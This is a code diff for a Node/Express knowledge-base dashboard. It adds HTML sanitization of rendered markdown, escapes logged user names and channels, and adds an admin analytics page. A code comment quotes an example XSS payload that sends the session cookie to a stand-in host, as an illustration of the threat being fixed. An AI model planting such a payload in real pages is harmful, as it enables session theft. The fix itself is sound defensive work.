@@ -4,6 +4,7 @@ import fs from 'fs';
 import path from 'path';
 import matter from 'gray-matter';
 import { marked } from 'marked';
+import sanitizeHtml from 'sanitize-html';
 import { buildUserRoster, readPeopleDir } from './roster.mjs';
 import { createRequire } from 'module';
 // better-sqlite3 is in the parent /opt/breadbrich/node_modules, not kb-ui's
@@ -147,6 +148,46 @@ function canView(frontmatter, username) {
 function esc(str) {
   if (!str) return '';
   return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
+// Render KB markdown -> HTML, then sanitize. KB documents now include
+// third-party-authored content synced by knowledge connectors
+// (Notion / Google Drive -> context/connectors/...), so a doc an outside
+// collaborator can edit could embed raw HTML like
+// <img src=x onerror=fetch('//evil/'+document.cookie)> or <script>...</script>
+// and run in an authenticated admin's dashboard session on view. marked() does
+// NOT sanitize, so every marked() render of user/connector content MUST go
+// through this helper. sanitize-html strips any tag/attr not on the allowlist,
+// which removes <script>, <style>, all on* event handlers, and (via the
+// scheme allowlist) javascript:/data: URLs. This is ONLY for document/markdown
+// bodies — the dashboard's own trusted layout/nav/scripts are never sanitized.
+const MARKDOWN_SANITIZE_OPTIONS = {
+  allowedTags: [
+    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+    'p', 'br', 'hr',
+    'strong', 'em', 'b', 'i', 'u', 'del', 's', 'sub', 'sup',
+    'code', 'pre',
+    'ul', 'ol', 'li',
+    'blockquote',
+    'a',
+    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td',
+  ],
+  allowedAttributes: {
+    a: ['href', 'title'],
+    th: ['align'],
+    td: ['align'],
+    code: ['class'], // marked emits language-* classes for fenced code blocks
+    pre: ['class'],
+  },
+  // Any scheme not listed here (e.g. javascript:, data:, vbscript:) is dropped.
+  allowedSchemes: ['http', 'https', 'mailto'],
+  allowProtocolRelative: false,
+  // img is intentionally NOT in allowedTags: the dashboard renders no images
+  // today and dropping the tag entirely removes the classic
+  // <img src=x onerror=...> vector with zero legitimate cost.
+};
+function renderMarkdown(md) {
+  return sanitizeHtml(marked(md || ''), MARKDOWN_SANITIZE_OPTIONS);
 }
 
 function walkDir(dir, basePath = '') {
@@ -331,6 +372,7 @@ app.get('/', (req, res) => {
   let adminCards = '';
   if (isAdmin(username)) {
     adminCards += `<a href="/logs" class="nav-card" style="border-color:#2a2a1a"><div class="icon">\u{1F4CB}</div><div class="label">Request Logs</div><div class="count">All Breadbrich Engels requests</div></a>`;
+    adminCards += `<a href="/analytics" class="nav-card" style="border-color:#2a1a2a"><div class="icon">\u{1F4C8}</div><div class="label">Analytics</div><div class="count">Usage & knowledge gaps</div></a>`;
     adminCards += `<a href="/architecture" class="nav-card" style="border-color:#1a1a2a"><div class="icon">\u{1F3D7}\u{FE0F}</div><div class="label">Architecture</div><div class="count">System diagram</div></a>`;
   }
   if (isSuperAdmin(username)) {
@@ -342,7 +384,7 @@ app.get('/', (req, res) => {
   const indexPath = path.join(CONTEXT_DIR, 'index.md');
   if (fs.existsSync(indexPath)) {
     const { content } = readDoc(indexPath);
-    summary = `<div class="doc-content" style="margin-top:24px">${marked(content)}</div>`;
+    summary = `<div class="doc-content" style="margin-top:24px">${renderMarkdown(content)}</div>`;
   }
 
   let body = '<h2 class="section-header">\u{1F4CA} Dashboards</h2>';
@@ -1215,7 +1257,7 @@ app.get('/doc/:category/:file', (req, res) => {
     visibleContent = content.replace(/^## Personnel Notes[\s\S]*?(?=^## |\s*$)/m, '');
   }
 
-  const html = marked(visibleContent);
+  const html = renderMarkdown(visibleContent);
 
   const body = `
     <div class="breadcrumb"><a href="/">Home</a> / <a href="/category/${cat}">${icon} ${cat.charAt(0).toUpperCase() + cat.slice(1)}</a> / ${title}</div>
@@ -1565,7 +1607,7 @@ app.get('/logs', (req, res) => {
   let logContent = '';
   if (fs.existsSync(logPath)) {
     const { content } = readDoc(logPath);
-    logContent = marked(content);
+    logContent = renderMarkdown(content);
   }
 
   // Also read live message stats from DB
@@ -1590,11 +1632,11 @@ app.get('/logs', (req, res) => {
     }
 
     let userStatsRows = byUser.map(r =>
-      `<tr><td style="color:#ddd">${r.sender_name}</td><td style="color:#999">${r.c}</td></tr>`
+      `<tr><td style="color:#ddd">${esc(r.sender_name)}</td><td style="color:#999">${r.c}</td></tr>`
     ).join('');
 
     let channelStatsRows = byChannel.map(r =>
-      `<tr><td style="color:#ddd">${channelNames[r.chat_jid] || r.chat_jid}</td><td style="color:#999">${r.c}</td></tr>`
+      `<tr><td style="color:#ddd">${esc(channelNames[r.chat_jid] || r.chat_jid)}</td><td style="color:#999">${r.c}</td></tr>`
     ).join('');
 
     let recentRows = recentMessages.map(r => {
@@ -1603,8 +1645,7 @@ app.get('/logs', (req, res) => {
       const timeStr = date.toISOString().slice(11, 16);
       const channel = channelNames[r.chat_jid] || r.chat_jid;
       const summary = r.content.length > 80 ? r.content.slice(0, 80) + '...' : r.content;
-      const escapedSummary = summary.replace(/</g, '&lt;').replace(/>/g, '&gt;');
-      return `<tr><td style="color:#999;font-size:12px">${dateStr}</td><td style="color:#999;font-size:12px">${timeStr}</td><td style="color:#ddd">${r.sender_name}</td><td style="color:#999;font-size:12px">${channel}</td><td style="color:#888;font-size:12px">${escapedSummary}</td></tr>`;
+      return `<tr><td style="color:#999;font-size:12px">${dateStr}</td><td style="color:#999;font-size:12px">${timeStr}</td><td style="color:#ddd">${esc(r.sender_name)}</td><td style="color:#999;font-size:12px">${esc(channel)}</td><td style="color:#888;font-size:12px">${esc(summary)}</td></tr>`;
     }).join('');
 
     dbStats = `
@@ -1641,6 +1682,175 @@ app.get('/logs', (req, res) => {
     <div class="doc-content" style="padding:16px">${logContent}</div>`;
 
   res.send(layout('Request Logs', body, username));
+});
+
+// --- Assistant Analytics (admin only) ---
+//
+// Usage volume, resolution rate, and knowledge gaps. The SQL here mirrors the
+// aggregation helpers in src/db.ts (we can't import compiled TS into this .mjs,
+// so the queries are duplicated). The knowledge_gap outcome is a best-effort
+// signal (explicit agent tool call OR output heuristic) — the page frames it as
+// directional, not exact.
+app.get('/analytics', (req, res) => {
+  const username = req.auth.user;
+  if (!isAdmin(username)) {
+    res.status(403).send(layout('Forbidden', '<p class="empty">Access restricted to admins.</p>', username));
+    return;
+  }
+
+  const DAYS = 14;
+  const sinceIso = new Date(Date.now() - DAYS * 86400000).toISOString();
+  const pct = (n, d) => (d > 0 ? Math.round((n / d) * 100) : 0);
+
+  let body;
+  try {
+    const Database = require('better-sqlite3');
+    const db = new Database(process.env.DB_PATH || DEFAULT_DB_PATH);
+
+    // Overall resolution stats (errors excluded from the resolution denominator).
+    const stats = db.prepare(`
+      SELECT COUNT(*) AS total,
+             SUM(is_question) AS questions,
+             SUM(CASE WHEN outcome='answered' THEN 1 ELSE 0 END) AS answered,
+             SUM(CASE WHEN outcome='knowledge_gap' THEN 1 ELSE 0 END) AS gaps,
+             SUM(CASE WHEN outcome='error' THEN 1 ELSE 0 END) AS errors
+      FROM assistant_events WHERE created_at >= ?`).get(sinceIso);
+    const total = stats.total || 0;
+    const answered = stats.answered || 0;
+    const gaps = stats.gaps || 0;
+    const errors = stats.errors || 0;
+    const resolutionPct = pct(answered, answered + gaps);
+
+    // Daily volume, per-outcome.
+    const volume = db.prepare(`
+      SELECT date(created_at) AS day,
+             COUNT(*) AS total,
+             SUM(CASE WHEN outcome='answered' THEN 1 ELSE 0 END) AS answered,
+             SUM(CASE WHEN outcome='knowledge_gap' THEN 1 ELSE 0 END) AS gaps,
+             SUM(CASE WHEN outcome='error' THEN 1 ELSE 0 END) AS errors
+      FROM assistant_events WHERE created_at >= ?
+      GROUP BY day ORDER BY day`).all(sinceIso);
+
+    // Per-group breakdown.
+    const groups = db.prepare(`
+      SELECT group_folder AS folder, MAX(group_name) AS name,
+             COUNT(*) AS total,
+             SUM(CASE WHEN outcome='answered' THEN 1 ELSE 0 END) AS answered,
+             SUM(CASE WHEN outcome='knowledge_gap' THEN 1 ELSE 0 END) AS gaps,
+             SUM(CASE WHEN outcome='error' THEN 1 ELSE 0 END) AS errors
+      FROM assistant_events WHERE created_at >= ?
+      GROUP BY group_folder ORDER BY total DESC`).all(sinceIso);
+
+    // Top unanswered (knowledge gaps with actionable text).
+    const unanswered = db.prepare(`
+      SELECT MAX(question_text) AS question, COUNT(*) AS count,
+             MAX(created_at) AS lastSeen, MAX(group_folder) AS sampleGroup
+      FROM assistant_events
+      WHERE created_at >= ? AND outcome='knowledge_gap'
+        AND question_text IS NOT NULL AND TRIM(question_text) != ''
+      GROUP BY LOWER(TRIM(question_text))
+      ORDER BY count DESC, lastSeen DESC LIMIT 15`).all(sinceIso);
+
+    const activeGroups = db.prepare(`
+      SELECT COALESCE(group_name, group_folder) AS name, COUNT(*) AS count
+      FROM assistant_events WHERE created_at >= ?
+      GROUP BY COALESCE(group_name, group_folder) ORDER BY count DESC LIMIT 10`).all(sinceIso);
+
+    const activeUsers = db.prepare(`
+      SELECT sender_name AS name, COUNT(*) AS count
+      FROM assistant_events
+      WHERE created_at >= ? AND sender_name IS NOT NULL AND TRIM(sender_name) != ''
+      GROUP BY sender_name ORDER BY count DESC LIMIT 10`).all(sinceIso);
+
+    db.close();
+
+    // --- Volume chart (div-based stacked bars; no JS framework) ---
+    const maxDay = volume.reduce((m, v) => Math.max(m, v.total), 0) || 1;
+    const barRows = volume.map(v => {
+      const h = Math.max(2, Math.round((v.total / maxDay) * 120));
+      const aH = Math.round((v.answered / (v.total || 1)) * h);
+      const gH = Math.round((v.gaps / (v.total || 1)) * h);
+      const eH = Math.max(0, h - aH - gH);
+      const dayLabel = esc(v.day.slice(5)); // MM-DD
+      return `<div style="display:flex;flex-direction:column;align-items:center;justify-content:flex-end;flex:1;min-width:0">
+        <div title="${esc(v.day)}: ${v.total} total, ${v.answered} answered, ${v.gaps} gaps, ${v.errors} errors" style="width:60%;max-width:28px;display:flex;flex-direction:column;justify-content:flex-end;height:${h}px">
+          <div style="height:${eH}px;background:#d9534f"></div>
+          <div style="height:${gH}px;background:#f0ad4e"></div>
+          <div style="height:${aH}px;background:#5cb85c"></div>
+        </div>
+        <div style="font-size:9px;color:#666;margin-top:4px;transform:rotate(-45deg);white-space:nowrap">${dayLabel}</div>
+      </div>`;
+    }).join('');
+    const volumeChart = volume.length
+      ? `<div style="display:flex;align-items:flex-end;gap:4px;height:160px;padding:8px 4px 24px">${barRows}</div>
+         <div style="font-size:11px;color:#777;margin-top:4px"><span style="color:#5cb85c">■ answered</span> &nbsp; <span style="color:#f0ad4e">■ knowledge gap</span> &nbsp; <span style="color:#d9534f">■ error</span></div>`
+      : `<p style="color:#666">No events in the last ${DAYS} days.</p>`;
+
+    // --- Per-group table ---
+    const groupRows = groups.map(g => {
+      const rate = pct(g.answered, g.answered + g.gaps);
+      const label = esc(g.name || g.folder);
+      return `<tr><td style="color:#ddd">${label}</td><td style="color:#999">${g.total}</td><td style="color:#5cb85c">${g.answered}</td><td style="color:#f0ad4e">${g.gaps}</td><td style="color:#d9534f">${g.errors}</td><td style="color:#7eb8da">${rate}%</td></tr>`;
+    }).join('') || `<tr><td colspan="6" style="color:#555">No data.</td></tr>`;
+
+    // --- Knowledge gaps list ---
+    const gapRows = unanswered.map(u => {
+      const q = esc(u.question);
+      const when = esc((u.lastSeen || '').slice(0, 10));
+      return `<tr>
+        <td style="color:#ddd">${q}</td>
+        <td style="color:#f0ad4e;text-align:center">${u.count}</td>
+        <td style="color:#777;font-size:12px">${when}</td>
+        <td><a href="/category/artifacts" title="Add a KB doc that answers this">+ Add to KB</a></td>
+      </tr>`;
+    }).join('') || `<tr><td colspan="4" style="color:#555">No knowledge gaps recorded \u{1F389}</td></tr>`;
+
+    const activeGroupRows = activeGroups.map(g =>
+      `<tr><td style="color:#ddd">${esc(g.name)}</td><td style="color:#999">${g.count}</td></tr>`).join('') || `<tr><td colspan="2" style="color:#555">No data.</td></tr>`;
+    const activeUserRows = activeUsers.map(u =>
+      `<tr><td style="color:#ddd">${esc(u.name)}</td><td style="color:#999">${u.count}</td></tr>`).join('') || `<tr><td colspan="2" style="color:#555">No named users (privacy config may redact senders).</td></tr>`;
+
+    body = `
+      <div class="breadcrumb"><a href="/">Home</a> / \u{1F4C8} Analytics</div>
+
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:24px">
+        <div class="doc-content" style="padding:16px;text-align:center"><div style="font-size:32px;font-weight:700;color:#7eb8da">${resolutionPct}%</div><div style="color:#888;font-size:12px">Resolution rate</div></div>
+        <div class="doc-content" style="padding:16px;text-align:center"><div style="font-size:32px;font-weight:700;color:#ddd">${total}</div><div style="color:#888;font-size:12px">Events (${DAYS}d)</div></div>
+        <div class="doc-content" style="padding:16px;text-align:center"><div style="font-size:32px;font-weight:700;color:#5cb85c">${answered}</div><div style="color:#888;font-size:12px">Answered</div></div>
+        <div class="doc-content" style="padding:16px;text-align:center"><div style="font-size:32px;font-weight:700;color:#f0ad4e">${gaps}</div><div style="color:#888;font-size:12px">Knowledge gaps</div></div>
+        <div class="doc-content" style="padding:16px;text-align:center"><div style="font-size:32px;font-weight:700;color:#d9534f">${errors}</div><div style="color:#888;font-size:12px">Errors</div></div>
+      </div>
+      <p style="color:#666;font-size:12px;margin-bottom:20px">Resolution rate = answered / (answered + knowledge gaps); errors excluded. The knowledge-gap signal is best-effort (explicit agent tool call, else output heuristic) — treat as directional.</p>
+
+      <h2 class="section-header">\u{1F4CA} Volume (last ${DAYS} days)</h2>
+      <div class="doc-content" style="margin-bottom:24px;padding:16px">${volumeChart}</div>
+
+      <h2 class="section-header">\u{1F50E} Knowledge gaps — top unanswered questions</h2>
+      <div class="doc-content" style="margin-bottom:24px;padding:16px">
+        <table><thead><tr><th>Question</th><th style="text-align:center">Count</th><th>Last seen</th><th></th></tr></thead><tbody>${gapRows}</tbody></table>
+      </div>
+
+      <h2 class="section-header">\u{1F465} By group</h2>
+      <div class="doc-content" style="margin-bottom:24px;padding:16px">
+        <table><thead><tr><th>Group</th><th>Total</th><th>Answered</th><th>Gaps</th><th>Errors</th><th>Resolution</th></tr></thead><tbody>${groupRows}</tbody></table>
+      </div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+        <div>
+          <h2 class="section-header">\u{1F525} Most active groups</h2>
+          <div class="doc-content" style="padding:16px"><table><thead><tr><th>Group</th><th>Events</th></tr></thead><tbody>${activeGroupRows}</tbody></table></div>
+        </div>
+        <div>
+          <h2 class="section-header">\u{1F464} Most active users</h2>
+          <div class="doc-content" style="padding:16px"><table><thead><tr><th>User</th><th>Events</th></tr></thead><tbody>${activeUserRows}</tbody></table></div>
+        </div>
+      </div>`;
+  } catch (e) {
+    body = `<div class="breadcrumb"><a href="/">Home</a> / \u{1F4C8} Analytics</div>
+      <div class="doc-content" style="padding:16px"><p style="color:#666">Analytics unavailable: ${esc(e.message)}</p></div>`;
+  }
+
+  res.send(layout('Analytics', body, username));
 });
 
 // --- Admin Dashboard (superadmin only — see KB_SUPERADMINS) ---
